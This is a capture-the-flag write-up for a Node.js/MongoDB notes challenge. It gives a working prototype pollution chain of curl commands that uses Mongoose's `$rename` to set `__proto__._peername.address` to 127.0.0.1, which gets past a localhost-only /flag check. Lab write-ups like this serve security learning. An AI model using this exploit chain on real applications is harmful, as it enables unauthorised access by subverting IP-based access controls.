---
title: "SecureNotes"
categories: [Writeups]
date: 2026-07-17 11:30:00 +0700
tags: [prototype-pollution, nodejs, mongodb, express, mongoose]
---

Prototype pollution challenge. The `/flag` endpoint only hands the flag over
if the request looks like it came from localhost, so the whole challenge is
convincing the server that it did.

## What I was looking at

The `/flag` endpoint kept returning "Access denied". After poking around I
realised it only hands the flag over if the request looks like it came from
localhost (127.0.0.1). Since I was obviously not connecting from localhost,
I needed to make the server believe I was.

## Fingerprinting the stack

I pieced the backend together from the responses:

- JSON responses had `_id` and `__v` fields, so the backend was **MongoDB**.
- `X-Powered-By: Express` told me it was a **Node.js** app.
- Trying search-style injection (`$ne`, `$regex`) on `/update` just threw
  "An error occurred", so `/update` wasn't a search endpoint, it was an
  **update** endpoint. That pointed me at `$rename` for prototype pollution
  instead.

A Node app reading the client IP from a cached `_peername` object, plus a
Mongoose update that accepts operators, is the perfect setup to poison
`__proto__._peername.address` and fake being localhost.

## Step 1: stash the values I want to inject

`$rename` moves the value of an *existing* field onto a new path, so first I
created a note holding the exact values I wanted, `127.0.0.1` in `title` and
`IPv4` in `content`:

```bash
ID=$(curl -s -X POST 'http://TARGET:PORT/create' \
  -H 'Content-Type: application/json' \
  -d '{"title":"127.0.0.1","content":"IPv4"}' | jq -r '._id')
echo "$ID"
```

## Step 2: rename those fields onto the prototype

```bash
curl -s -X POST 'http://TARGET:PORT/update' \
  -H 'Content-Type: application/json' \
  -d "{\"noteId\":\"$ID\",\"\$rename\":{\"title\":\"__proto__._peername.address\",\"content\":\"__proto__._peername.family\"}}"
```

This shifts `title` (127.0.0.1) onto the path the server reads the client IP
from, and `content` (IPv4) onto the IP type. After this the server thinks
every connection is coming from localhost.

## Step 3: grab the flag

```bash
curl -s 'http://TARGET:PORT/flag'
```

And there it was, `HTB{...}` instead of the access denied message.

## Full chain

```bash
ID=$(curl -s -X POST 'http://TARGET:PORT/create' -H 'Content-Type: application/json' \
     -d '{"title":"127.0.0.1","content":"IPv4"}' | jq -r '._id')

curl -s -X POST 'http://TARGET:PORT/update' -H 'Content-Type: application/json' \
     -d "{\"noteId\":\"$ID\",\"\$rename\":{\"title\":\"__proto__._peername.address\",\"content\":\"__proto__._peername.family\"}}"

curl -s 'http://TARGET:PORT/flag'
```

## Takeaways

- A page that says "localhost only" isn't a wall, it's a hint about how the
  check works.
- On a Node and Mongo app the move is `$rename` to
  `__proto__._peername.address` set to `127.0.0.1`.
- You can only rename fields that already exist, so stash the value you want
  in a normal field first, then rename it onto the prototype.
